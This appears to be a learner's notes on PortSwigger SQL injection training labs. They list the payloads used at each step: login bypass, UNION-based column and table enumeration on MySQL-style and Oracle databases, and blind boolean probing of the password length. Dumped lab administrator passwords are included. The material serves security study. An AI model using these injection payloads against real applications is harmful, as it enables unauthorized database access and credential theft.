https://portswigger.net/web-security/sql-injection/cheat-sheet   -> db cheatsheet


![[Pasted image 20230129112504.png]]
In this lab -> i test at Gifts permeter 
'+or+1=1--

----
![[Pasted image 20230129112831.png]]

In this lab -> i was change to username by like this -> password is whatever
administrator' --

---
![[Pasted image 20230129113521.png]]

In this lab -> i use this command to solve 
`'+UNION+SELECT+NULL,NULL,NULL--`

---
![[Pasted image 20230129114329.png]]

This lab -> i tried to check about string data 
'+UNION+SELECT+ NULL,'opymIc',NULL--

---
`'+UNION+SELECT+username,+password+FROM+users--`
I use this command to get username and password 

---

![[Pasted image 20230131220554.png]]

`'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`   => i use this pay load for this challenge

----

![[Pasted image 20230131221018.png]]
I just use this payload for this challenge -> i dont look at answe hehe!! 
-> take cate of space --> replace with + sign

---

I using this payload cuz there is two db      ---> '+UNION+SELECT+NULL,NULL--

'+UNION+SELECT+table_name,+NULL+from+information_schema.tables--     => for tables

'+UNION+SELECT+column_name,+NULL+from+information_schema.columns+where+table_name='users_cyjvyo'--    => for columns

'+UNION+SELECT+username_lvhaae,+password_jjdekp+FROM+users_cyjvyo --    -> dump

administrator

unvo4qdig2ani5hymaw5

------

 Interesting task

'+UNION+SELECT+'abc',+'abc'+FROM+all_tables--

`'+UNION+SELECT+table_name,NULL+FROM+all_tables--`  => for tables

`'+UNION+SELECT+column_name,'abc'+FROM+all_tab_columns+WHERE+table_name='USERS_QPGAVM'--`    => for columns 

`'+UNION+SELECT+USERNAME_EXKFJY,+PASSWORD_FQINEZ+FROM+USERS_QPGAVM--`  => data dump

administrator

ac2ky60fgcnkwgosoyjp

-----

cookie error base

' AND 1=1 -- -     => It's working 

' AND 1=2 -- -    => It's not working 

AND (SELECT 'a' FROM users LIMIT 1)='a'  => I am sure there have users table 

AND (SELECT 'a' FROM users WHERE username='administrator')='a' => I am sure there have administrator have in this table

AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'   => password length is greater than 1



